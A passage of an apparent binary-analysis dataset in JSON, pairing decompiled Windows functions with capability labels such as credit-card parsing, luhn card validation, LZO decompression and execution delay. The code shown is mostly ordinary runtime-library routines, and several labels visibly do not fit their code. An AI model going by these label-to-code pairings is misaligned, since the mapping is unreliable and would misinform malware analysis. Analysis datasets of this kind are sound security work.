   *(&stack0xffffffb0 + iVar7) = 0x441e67;\n            cVar1 = fcn.00438000();\n            *pcVar5 = cVar1 + '0';\n            *(&stack0xffffffb4 + iVar7) = iVar10;\n            *(&stack0xffffffb8 + iVar7) = uVar8;\n            *(&stack0xffffffbc + iVar7) = 10;\n            *(&stack0xffffffc0 + iVar7) = 0;\n            *(&stack0xffffffb0 + iVar7) = 0x441e88;\n            iVar10 = fcn.00437f00();\n            pcVar4 = pcStack36;\n            param_2 = aiStack80[7];\n            if (iVar10 == 0) break;\n            if ((((pcStack40 != pcStack36) && (uStack48 != 0)) && (*(aiStack80[7] + 0x1c) != 0)) &&\n               (uVar6 = (pcStack36 - pcStack40 >> 0x1f) >> 0x1e,  ((pcStack36 - pcStack40) + uVar6 & 3) - uVar6 == 3)) {\n                pcVar5[1] = ',';\n                pcStack36 = pcVar5 + 2;\n            }\n        }\n    }\n    if ((0 < aiStack80[6]) && (iVar3 = aiStack80[6] - (pcVar4 - pcStack40),  0 < iVar3)) {\n        pcVar2 = pcVar4 + iVar3;\n        pcVar5 = pcVar4;\n        do {\n            pcVar4 = pcVar5 + 1;\n            *pcVar5 = '0';\n            pcVar5 = pcVar4;\n        } while (pcVar4 != pcVar2);\n    }\n    if ((pcStack40 == pcVar4) && (aiStack80[6] != 0)) {\n        *pcVar4 = '0';\n        pcVar4 = pcVar4 + 1;\n    }\n    if (0 < aiStack80[5]) {\n        iVar3 = aiStack80[5] - (pcVar4 - pcStack40);\n        *(param_2 + 8) = iVar3;\n        if (0 < iVar3) {\n            if ((pcStack44 & 0x1c0) != 0) {\n                *(param_2 + 8) = iVar3 + -1;\n            }\n            if ((aiStack80[6] < 0) && ((pcStack44 & 0x600) == 0x200)) {\n                iVar3 = *(param_2 + 8);\n                *(param_2 + 8) = iVar3 + -1;\n                if (0 < iVar3) {\n                    pcVar2 = pcVar4 + iVar3;\n                    pcVar5 = pcVar4;\n                    do {\n                        pcVar4 = pcVar5 + 1;\n                        *pcVar5 = '0';\n                        pcVar5 = pcVar4;\n                    } while (pcVar4 != pcVar2);\n                    *(param_2 + 8) = 0xffffffff;\n                }\n            }\n            else if (((pcStack44 & 0x400) == 0) && (iVar3 = *(param_2 + 8),  *(param_2 + 8) = iVar3 + -1,  0 < iVar3)) {\n                do {\n                    *(&stack0xffffffb0 + iVar7) = 0x44200c;\n                    fcn.00441540();\n                    iVar3 = *(param_2 + 8);\n                    *(param_2 + 8) = iVar3 + -1;\n                } while (0 < iVar3);\n                pcStack44 = *(param_2 + 4);\n            }\n        }\n    }\n    pcVar5 = pcStack40;\n    if ((pcStack44 & 0x80) == 0) {\n        if ((pcStack44 & 0x100) == 0) {\n            pcVar2 = pcVar4;\n            if ((pcStack44 & 0x40) != 0) {\n                pcVar2 = pcVar4 + 1;\n                *pcVar4 = ' ';\n            }\n        }\n        else {\n            *pcVar4 = '+';\n            pcVar2 = pcVar4 + 1;\n        }\n    }\n    else {\n        *pcVar4 = '-';\n        pcVar2 = pcVar4 + 1;\n    }\n    if (pcVar2 <= pcStack40) goto code_r0x00441f8e;\n    do {\n        pcVar2 = pcVar2 + -1;\n        *(&stack0xffffffb0 + iVar7) = 0x441f71;\n        fcn.00441540();\n    } while (pcVar5 != pcVar2);\n    iVar3 = *(param_2 + 8);\n    *(param_2 + 8) = iVar3 + -1;\n    while (0 < iVar3) {\n        *(&stack0xffffffb0 + iVar7) = 0x441f8e;\n        fcn.00441540();\ncode_r0x00441f8e:\n        iVar3 = *(param_2 + 8);\n        *(param_2 + 8) = iVar3 + -1;\n    }\n    return;\n}\n",
        "token_count": 2051
    },
    "00448530": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00448530(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    iVar3 = param_1;\n    do {\n        while (iVar1 = sub.msvcrt.dll__write(),  iVar1 != -1) {\n            iVar3 = iVar3 - iVar1;\n            if (iVar3 == 0) {\n                return param_1;\n            }\n        }\n        piVar2 = (*_sym.imp.msvcrt.dll__errno)();\n    } while (*piVar2 == 4);\n    return param_1 - iVar3;\n}\n",
        "token_count": 144
    },
    "004502d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004502d0(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    bool bVar4;\n    bool bStack13;\n    \n    piVar1 = *param_1;\n    bVar4 = piVar1 != NULL && param_1[1] == 0xffffffff;\n    bStack13 = param_1[1] == 0xffffffff;\n    if (bVar4) {\n        in_EAX = piVar1[3];\n        bStack13 = false;\n        if (in_EAX <= piVar1[2]) {\n            bStack13 = false;\n            in_EAX = (**(*piVar1 + 0x24))();\n            if (in_EAX == 0xffffffff) {\n                *param_1 = NULL;\n                bStack13 = bVar4;\n            }\n        }\n    }\n    piVar1 = *param_2;\n    uVar3 = in_EAX & 0xffffff00;\n    bVar2 = piVar1 != NULL && param_2[1] == 0xffffffff;\n    bVar4 = param_2[1] == 0xffffffff;\n    if (bVar2) {\n        uVar3 = piVar1[3];\n        bVar4 = false;\n        if (uVar3 <= piVar1[2]) {\n            uVar3 = (**(*piVar1 + 0x24))();\n            if (uVar3 == 0xffffffff) {\n                *param_2 = NULL;\n                bVar4 = bVar2;\n            }\n        }\n    }\n    return uVar3 & 0xffffff00 | bStack13 == bVar4;\n}\n",
        "token_count": 396
    },
    "00450370": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00450370(uint param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **in_EAX;\n    \n    piVar1 = *in_EAX;\n    if ((param_2 == 0xffffffff) && (piVar1 != NULL)) {\n        if (piVar1[2] < piVar1[3]) {\n            return *piVar1[2];\n        }\n        param_2 = (**(*piVar1 + 0x24))();\n        if (param_2 == 0xffffffff) {\n            *in_EAX = NULL;\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 150
    },
    "004503c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004503c0(uint param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **in_EAX;\n    \n    piVar1 = *in_EAX;\n    if ((param_2 == 0xffffffff) && (piVar1 != NULL)) {\n        if (piVar1[2] < piVar1[3]) {\n            return *piVar1[2];\n        }\n        param_2 = (**(*piVar1 + 0x24))();\n        if (param_2 == 0xffffffff) {\n            *in_EAX = NULL;\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 151
    },
    "004a5560": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004a5560(int32_t *param_1)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    puVar2 = param_1[2];\n    if (puVar2 < param_1[3]) {\n        uVar1 = *puVar2;\n        param_1[2] = puVar2 + 1;\n        return uVar1;\n    }\n    UNRECOVERED_JUMPTABLE = *(*param_1 + 0x28);\n    if (UNRECOVERED_JUMPTABLE == method.c_streambufIwSt11char_traitsIwEE.virtual_40) {\n        UNRECOVERED_JUMPTABLE = *(*param_1 + 0x24);\n        if (UNRECOVERED_JUMPTABLE == method.c_streambufIwSt11char_traitsIwEE.virtual_36) {\n            return 0xffffffff;\n        }\n        iVar3 = (*UNRECOVERED_JUMPTABLE)();\n        if (iVar3 == -1) {\n            uVar4 = 0xffffffff;\n        }\n        else {\n            uVar4 = *param_1[2];\n            param_1[2] = param_1[2] + 1;\n        }\n        return uVar4;\n    }\n    // WARNING: Could not recover jumptable at 0x004a5590. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar4 = (*UNRECOVERED_JUMPTABLE)();\n    return uVar4;\n}\n",
        "token_count": 367
    },
    "004bd030": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004bd030(uchar *param_1, uchar param_2, char *param_3, int32_t param_4, uchar *param_5, uchar *param_6)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uchar *puVar9;\n    int32_t iStack24;\n    \n    uVar5 = 0;\n    iStack24 = 0;\n    uVar3 = *param_3;\n    uVar6 = uVar3;\n    while (uVar3 < param_6 - param_5) {\n        while( true ) {\n            if (0x7d < uVar6 - 1U) goto code_r0x004bd098;\n            param_6 = param_6 + -uVar3;\n            if (param_4 - 1U <= uVar5) break;\n            uVar5 = uVar5 + 1;\n            uVar6 = param_3[uVar5];\n            uVar3 = param_3[uVar5];\n            if (param_6 - param_5 <= uVar3) goto code_r0x004bd098;\n        }\n        iStack24 = iStack24 + 1;\n    }\ncode_r0x004bd098:\n    puVar7 = param_5;\n    puVar8 = param_1;\n    if (param_6 != param_5) {\n        do {\n            puVar9 = puVar7 + 1;\n            *puVar8 = *puVar7;\n            puVar7 = puVar9;\n            puVar8 = puVar8 + 1;\n        } while (param_6 != puVar9);\n        param_1 = param_1 + (param_6 - param_5);\n    }\n    while (iStack24 = iStack24 + -1,  iStack24 != -1) {\n        while( true ) {\n            puVar7 = param_1 + 1;\n            *param_1 = param_2;\n            uVar2 = param_3[uVar5];\n            param_1 = puVar7;\n            if (uVar2 < '\\x01') break;\n            puVar8 = param_6;\n            puVar9 = puVar7;\n            do {\n                puVar1 = puVar8 + 1;\n                *puVar9 = *puVar8;\n                puVar8 = puVar1;\n                puVar9 = puVar9 + 1;\n            } while (puVar1 != param_6 + (uVar2 - 1 & 0xff) + 1);\n            iStack24 = iStack24 + -1;\n            iVar4 = (uVar2 - 1) + 1;\n            param_6 = param_6 + iVar4;\n            param_1 = puVar7 + iVar4;\n            if (iStack24 == -1) goto joined_r0x004bd117;\n        }\n    }\njoined_r0x004bd117:\n    while (uVar5 = uVar5 - 1,  uVar5 != 0xffffffff) {\n        puVar7 = param_1 + 1;\n        *param_1 = param_2;\n        uVar2 = param_3[uVar5];\n        param_1 = puVar7;\n        if ('\\0' < uVar2) {\n            puVar8 = param_6;\n            puVar9 = puVar7;\n            do {\n                puVar1 = puVar8 + 1;\n                *puVar9 = *puVar8;\n                puVar8 = puVar1;\n                puVar9 = puVar9 + 1;\n            } while (puVar1 != param_6 + (uVar2 - 1 & 0xff) + 1);\n            iVar4 = (uVar2 - 1) + 1;\n            param_6 = param_6 + iVar4;\n            param_1 = puVar7 + iVar4;\n        }\n    }\n    return;\n}\n",
        "token_count": 908
    },
    "00438530": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint8_t ** __fastcall fcn.00438530(uint8_t **param_1, uint8_t **param_2, uint8_t **param_3)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint8_t in_AL;\n    int32_t iVar3;\n    code *pcVar4;\n    uint8_t **ppuVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    uint8_t **ppuVar9;\n    uint8_t **ppuVar10;\n    \n    if (in_AL == 0x50) {\n        ppuVar5 = param_1 + 3 & 0xfffffffc;\n        *param_3 = *ppuVar5;\n        return ppuVar5 + 1;\n    }\n    // switch table (13 cases) at 0x526cbc\n    switch(in_AL & 0xf) {\n    case 0:\n    case 3:\n    case 0xb:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 1;\n        break;\n    case 1:\n        ppuVar10 = NULL;\n        uVar7 = 0;\n        ppuVar9 = param_1;\n        do {\n            ppuVar5 = ppuVar9 + 1;\n            uVar6 = *ppuVar9;\n            uVar1 = uVar7 & 0x1f;\n            uVar7 = uVar7 + 7;\n            ppuVar10 = ppuVar10 | (uVar6 & 0x7f) << uVar1;\n            ppuVar9 = ppuVar5;\n        } while (uVar6 < '\\0');\n        break;\n    case 2:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 2;\n        break;\n    case 4:\n    case 0xc:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 2;\n        break;\n    default:\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n        if (iVar3 == 0) {\n            *0x4ce004 = 0x43c000;\n            pcVar4 = 0x43bdb0;\n        }\n        else {\n            *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n            pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n            pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"__register_frame_info\");\n            *0x4ce004 = (*pcVar2)(iVar3, \"__deregister_frame_info\");\n        }\n        if (pcVar4 != NULL) {\n            (*pcVar4)(0x52e0f8, 0x56b01c);\n        }\n        ppuVar5 = fcn.004014c0(fcn.00401590);\n        return ppuVar5;\n    case 9:\n        ppuVar10 = NULL;\n        uVar8 = 0;\n        ppuVar9 = param_1;\n        do {\n            ppuVar5 = ppuVar9 + 1;\n            uVar7 = *ppuVar9;\n            uVar6 = uVar8;\n            uVar8 = uVar8 + 7;\n            ppuVar10 = ppuVar10 | (uVar7 & 0x7f) << (uVar6 & 0x1f);\n            ppuVar9 = ppuVar5;\n        } while (uVar7 < '\\0');\n        if ((0x1f < uVar8) || ((uVar7 & 0x40) == 0)) break;\n        ppuVar10 = ppuVar10 | -1 << (uVar8 & 0x1f);\n        goto code_r0x00438569;\n    case 10:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 2;\n    }\n    if (ppuVar10 != NULL) {\ncode_r0x00438569:\n        if ((in_AL & 0x70) != 0x10) {\n            param_1 = param_2;\n        }\n        ppuVar10 = ppuVar10 + param_1;\n        if (in_AL < '\\0') {\n            *param_3 = *ppuVar10;\n            return ppuVar5;\n        }\n    }\n    *param_3 = ppuVar10;\n    return ppuVar5;\n}\n",
        "token_count": 1159
    },
    "0043ad20": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint8_t ** __fastcall fcn.0043ad20(uint8_t **param_1, uint8_t **param_2, uint8_t **param_3)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint8_t in_AL;\n    int32_t iVar3;\n    code *pcVar4;\n    uint8_t **ppuVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    uint8_t **ppuVar9;\n    uint8_t **ppuVar10;\n    \n    if (in_AL == 0x50) {\n        ppuVar5 = param_1 + 3 & 0xfffffffc;\n        *param_3 = *ppuVar5;\n        return ppuVar5 + 1;\n    }\n    // switch table (13 cases) at 0x5271d8\n    switch(in_AL & 0xf) {\n    case 0:\n    case 3:\n    case 0xb:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 1;\n        break;\n    case 1:\n        ppuVar10 = NULL;\n        uVar7 = 0;\n        ppuVar9 = param_1;\n        do {\n            ppuVar5 = ppuVar9 + 1;\n            uVar6 = *ppuVar9;\n            uVar1 = uVar7 & 0x1f;\n            uVar7 = uVar7 + 7;\n            ppuVar10 = ppuVar10 | (uVar6 & 0x7f) << uVar1;\n            ppuVar9 = ppuVar5;\n        } while (uVar6 < '\\0');\n        break;\n    case 2:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 2;\n        break;\n    case 4:\n    case 0xc:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 2;\n        break;\n    default:\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n        if (iVar3 == 0) {\n            *0x4ce004 = 0x43c000;\n            pcVar4 = 0x43bdb0;\n        }\n        else {\n            *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n            pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n            pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"__register_frame_info\");\n            *0x4ce004 = (*pcVar2)(iVar3, \"__deregister_frame_info\");\n        }\n        if (pcVar4 != NULL) {\n            (*pcVar4)(0x52e0f8, 0x56b01c);\n        }\n        ppuVar5 = fcn.004014c0(fcn.00401590);\n        return ppuVar5;\n    case 9:\n        ppuVar10 = NULL;\n        uVar8 = 0;\n        ppuVar9 = param_1;\n        do {\n            ppuVar5 = ppuVar9 + 1;\n            uVar7 = *ppuVar9;\n            uVar6 = uVar8;\n            uVar8 = uVar8 + 7;\n            ppuVar10 = ppuVar10 | (uVar7 & 0x7f) << (uVar6 & 0x1f);\n            ppuVar9 = ppuVar5;\n        } while (uVar7 < '\\0');\n        if ((0x1f < uVar8) || ((uVar7 & 0x40) == 0)) break;\n        ppuVar10 = ppuVar10 | -1 << (uVar8 & 0x1f);\n        goto code_r0x0043ad59;\n    case 10:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 2;\n    }\n    if (ppuVar10 != NULL) {\ncode_r0x0043ad59:\n        if ((in_AL & 0x70) != 0x10) {\n            param_1 = param_2;\n        }\n        ppuVar10 = ppuVar10 + param_1;\n        if (in_AL < '\\0') {\n            *param_3 = *ppuVar10;\n            return ppuVar5;\n        }\n    }\n    *param_3 = ppuVar10;\n    return ppuVar5;\n}\n",
        "token_count": 1068
    },
    "0043e470": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.0043e470(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    iVar4 = param_2 + 0x1f >> 5;\n    if (*(param_1 + 4) < iVar4) {\n        fcn.00446000(param_1);\n        param_1 = fcn.00445f30(iVar4);\n    }\n    puVar2 = param_1 + 0x14;\n    iVar4 = param_2 >> 5;\n    param_2 = param_2 & 0x1f;\n    if (param_2 == 0) {\n        *(param_1 + 0x10) = iVar4;\n        puVar1 = puVar2 + iVar4;\n        if (puVar1 <= puVar2) {\n            return;\n        }\n    }\n    else {\n        *(param_1 + 0x10) = iVar4 + 1;\n        puVar1 = puVar2 + iVar4 + 1;\n        puVar3 = puVar2;\n        if (puVar1 <= puVar2) goto code_r0x0043e4b4;\n    }\n    do {\n        puVar3 = puVar2 + 1;\n        *puVar2 = 0xffffffff;\n        puVar2 = puVar3;\n    } while (puVar3 < puVar1);\n    if (param_2 == 0) {\n        return;\n    }\ncode_r0x0043e4b4:\n    puVar3[-1] = puVar3[-1] >> (0x20U - param_2 & 0x1f);\n    return;\n}\n",
        "token_count": 389
    },
    "00446480": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nint32_t fcn.00446480(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int8_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint32_t *puVar13;\n    uint32_t *puVar14;\n    uint8_t uStack44;\n    uint32_t *puVar8;\n    \n    iVar10 = *(param_1 + 4);\n    iVar12 = param_2 >> 5;\n    iVar4 = *(param_1 + 0x10) + iVar12;\n    iVar11 = iVar4 + 1;\n    iVar5 = *(param_1 + 8);\n    if (iVar5 < iVar11) {\n        do {\n            iVar1 = iVar5 * 2;\n            iVar10 = iVar10 + 1;\n            iVar2 = iVar5 * -2;\n            iVar5 = iVar1;\n        } while (iVar11 != iVar1 && SBORROW4(iVar11, iVar1) == iVar11 + iVar2 < 0);\n    }\n    iVar10 = fcn.00445f30(iVar10);\n    if (iVar10 != 0) {\n        puVar6 = iVar10 + 0x14;\n        if (0 < iVar12) {\n            puVar13 = puVar6 + iVar12;\n            puVar7 = puVar6;\n            do {\n                puVar8 = puVar7 + 1;\n                *puVar7 = 0;\n                puVar7 = puVar8;\n                puVar6 = puVar13;\n            } while (puVar8 != puVar13);\n        }\n        puVar13 = param_1 + 0x14;\n        puVar7 = puVar13 + *(param_1 + 0x10);\n        if ((param_2 & 0x1f) == 0) {\n            do {\n                puVar14 = puVar6 + 1;\n                puVar8 = puVar13 + 1;\n                *puVar6 = *puVar13;\n                if (puVar7 <= puVar8) break;\n                puVar6 = puVar6 + 2;\n                puVar13 = puVar13 + 2;\n                *puVar14 = *puVar8;\n            } while (puVar13 < puVar7);\n        }\n        else {\n            iVar3 = param_2 & 0x1f;\n            uStack44 = 0x20 - iVar3;\n            uVar9 = 0;\n            do {\n                puVar14 = puVar6;\n                puVar8 = puVar13 + 1;\n                *puVar14 = uVar9 | *puVar13 << iVar3;\n                uVar9 = *puVar13 >> (uStack44 & 0x1f);\n                puVar13 = puVar8;\n                puVar6 = puVar14 + 1;\n            } while (puVar8 < puVar7);\n            puVar14[1] = uVar9;\n            if (uVar9 != 0) {\n                iVar11 = iVar4 + 2;\n            }\n        }\n        *(iVar10 + 0x10) = iVar11 + -1;\n        fcn.00446000(param_1);\n    }\n    return iVar10;\n}\n",
        "token_count": 771
    },
    "00448e10": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\nint32_t fcn.00448e10(char *param_1, int32_t param_2, char *param_3, char **param_4)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char **ppcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    char cVar6;\n    char *s1;\n    char *pcVar7;\n    char *pcVar8;\n    \n    pcVar1 = param_1 + param_2 + -1;\n    s1 = param_1;\ncode_r0x00448e39:\n    do {\n        cVar6 = *param_3;\n        ppcVar3 = param_4;\n        while( true ) {\n            if (cVar6 == '\\0') {\n                *s1 = '\\0';\n                return s1 - param_1;\n            }\n            if (pcVar1 <= s1) goto code_r0x00448ef0;\n            if (cVar6 != '%') goto code_r0x00448e31;\n            cVar2 = param_3[1];\n            if (cVar2 != 's') break;\n            pcVar4 = *ppcVar3;\n            cVar6 = *pcVar4;\n            if (cVar6 != '\\0') {\n                pcVar8 = pcVar4 + (pcVar1 - s1);\n                pcVar7 = s1;\n                while( true ) {\n                    pcVar4 = pcVar4 + 1;\n                    s1 = pcVar7 + 1;\n                    *pcVar7 = cVar6;\n                    cVar6 = *pcVar4;\n                    if (cVar6 == '\\0') break;\n                    pcVar7 = s1;\n                    if (pcVar8 == pcVar4) goto code_r0x00448ef0;\n                }\n            }\n            param_3 = param_3 + 2;\n            cVar6 = *param_3;\n            ppcVar3 = ppcVar3 + 1;\n        }\n        if (cVar2 == 'z') {\n            if (param_3[2] == 'u') {\n                param_4 = ppcVar3 + 1;\n                iVar5 = fcn.00448d80(s1, pcVar1 - s1, *ppcVar3);\n                if (iVar5 < 1) {\ncode_r0x00448ef0:\n                    fcn.00449b20(param_1, s1);\n                    return *(extraout_ECX + 0x20);\n                }\n                s1 = s1 + iVar5;\n                param_3 = param_3 + 3;\n                goto code_r0x00448e39;\n            }\n        }\n        else {\n            param_3 = param_3 + (cVar2 == '%');\n        }\ncode_r0x00448e31:\n        *s1 = cVar6;\n        param_3 = param_3 + 1;\n        s1 = s1 + 1;\n        param_4 = ppcVar3;\n    } while( true );\n}\n",
        "token_count": 680
    },
    "004467d0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nfloat10 fcn.004467d0(int32_t param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint32_t uStack32;\n    \n    uVar1 = param_1 + 0x14;\n    iVar2 = uVar1 + *(param_1 + 0x10) * 4;\n    uStack32 = *(iVar2 + -4);\n    uVar3 = 0x1f;\n    if (uStack32 != 0) {\n        for (; uStack32 >> uVar3 == 0; uVar3 = uVar3 - 1) {\n        }\n    }\n    uVar3 = uVar3 ^ 0x1f;\n    *param_2 = 0x20 - uVar3;\n    if (uVar3 < 0xb) {\n        uVar5 = 0xb - uVar3;\n        uVar6 = 0;\n        if (uVar1 < iVar2 - 4U) {\n            uVar6 = *(iVar2 + -8) >> (uVar5 & 0x1f);\n        }\n        return CONCAT44(uStack32 >> (uVar5 & 0x1f), uStack32 << (uVar3 + 0x15U & 0x1f) | uVar6) | 0x3ff0000000000000;\n    }\n    iVar4 = uVar3 - 0xb;\n    uVar5 = iVar4;\n    if (uVar1 < iVar2 - 4U) {\n        uVar3 = *(iVar2 + -8);\n        if (iVar4 != 0) {\n            uStack32 = uStack32 << (uVar5 & 0x1f) | 0x3ff00000 | uVar3 >> (0x20 - uVar5 & 0x1f);\n            uVar3 = uVar3 << (uVar5 & 0x1f);\n            if (uVar1 < iVar2 - 8U) {\n                uVar3 = uVar3 | *(iVar2 + -0xc) >> (0x20 - uVar5 & 0x1f);\n            }\n            goto code_r0x004468a4;\n        }\n    }\n    else {\n        uVar3 = 0;\n        if (iVar4 != 0) {\n            uVar3 = 0;\n            uStack32 = uStack32 << (uVar5 & 0x1f) | 0x3ff00000;\n            goto code_r0x004468a4;\n        }\n    }\n    uStack32 = uStack32 | 0x3ff00000;\ncode_r0x004468a4:\n    return CONCAT44(uStack32, uVar3);\n}\n",
        "token_count": 646
    },
    "004382e0": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.004382e0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    LOCK();\n    *param_1 = *param_1 + 1;\n    if (*param_1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(param_1[1], 0xffffffff);\n        if (iVar1 != 0) {\n            LOCK();\n            *param_1 = *param_1 + -1;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 124
    },
    "004383e0": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.004383e0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    LOCK();\n    *param_1 = *param_1 + 1;\n    if (*param_1 == 0) {\n        param_1[1] = 1;\n        param_1[2] = iVar1;\n        uVar2 = 0;\n    }\n    else {\n        if (param_1[2] == iVar1) {\n            LOCK();\n            *param_1 = *param_1 + -1;\n            param_1[1] = param_1[1] + 1;\n            return 0;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(param_1[3], 0xffffffff);\n        if (iVar3 == 0) {\n            param_1[1] = 1;\n            param_1[2] = iVar1;\n            return 0;\n        }\n        LOCK();\n        *param_1 = *param_1 + -1;\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 275
    },
    "004014c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004014c0(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll__onexit(param_1);\n    return -(iVar1 == 0);\n}\n",
        "token_count": 51
    },
    "00411db6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00411db6(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch)\n\n{\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_19h;\n    uint var_ch;\n    \n    return *0x522430;\n}\n",
        "token_count": 111
    },
    "0041260c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
